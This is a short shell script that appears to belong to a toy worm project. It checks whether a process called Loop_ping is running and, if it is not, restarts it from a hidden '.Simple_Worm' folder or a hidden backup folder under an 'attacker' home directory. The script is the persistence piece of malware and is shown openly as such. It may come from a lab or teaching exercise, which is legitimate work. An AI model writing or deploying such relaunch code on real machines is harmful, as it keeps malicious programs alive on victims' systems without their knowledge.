#!/bin/sh

if ps -ef | grep -v grep | grep Loop_ping ; then
    exit 0
else
    test -e /home/attacker/Public/.Simple_Worm/Loop_ping && /home/attacker/Public/.Simple_Worm/Loop_ping || /home/attacker/Desktop/.Backup/Loop_ping
    exit 0
fi